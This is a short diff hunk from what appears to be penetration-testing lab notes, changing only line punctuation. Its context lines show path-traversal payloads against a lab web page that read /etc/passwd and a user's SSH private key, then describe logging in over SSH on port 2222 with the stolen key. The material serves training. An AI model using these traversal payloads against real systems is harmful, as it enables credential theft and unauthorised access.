@@ -1010,7 +1010,7 @@ http://mountaindesserts.com/meteor/index.php?
 1. page=../../../../../../../../../etc/passwd
 2. page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ```
-When we get the SSH private key, use the private key to connect to the target system via SSH on port 2222.
+When we get the SSH private key, use the private key to connect to the target system via SSH on port 2222.\
 Private key file: *dt_key*
 ```
 ┌──(chw㉿CHW-kali)-[/]
